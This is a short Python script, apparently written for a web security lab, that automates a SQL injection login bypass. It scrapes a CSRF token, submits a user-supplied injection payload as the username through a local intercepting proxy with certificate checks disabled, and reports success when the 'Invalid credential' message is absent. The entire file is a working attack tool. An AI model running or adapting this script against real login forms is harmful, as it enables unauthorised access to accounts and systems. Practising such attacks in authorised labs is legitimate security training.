import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy={

    'https':'http://127.0.0.1:8080', 
    'http':'http://127.0.0.1:8080'
}

header={

    'User-Agent':'Mozilla/5.0'
}

def csrf(session,base_url):
    response=session.get(base_url,verify=False,proxies=proxy)
    soup=BeautifulSoup(response.text,'html.parser')
    csrf=soup.find('input',{"name":"csrf"})['value']
    return csrf

def sqli(session,base_url,payload):
    token = csrf(session,base_url)
    data={
        'csrf': token,
        'username' :payload,
        'password':'string'
    }
    T=session.post(base_url, data=data,verify=False,proxies=proxy)
    test=T.text
    if "Invalid credential" not in test:
        return True
    else:
        return False
if __name__ == '__main__':
    if len(sys.argv)!= 3:
        print("Usage: python3 script.py <URL> <payload>")
        sys.exit(1)
    base_url=sys.argv[1].strip()
    payload= sys.argv[2].strip()
    
    session=requests.Session()

    if sqli(session,base_url,payload):
        print("SQL injection is successfull")
    else:
        print("SQLi unsuccessfull")
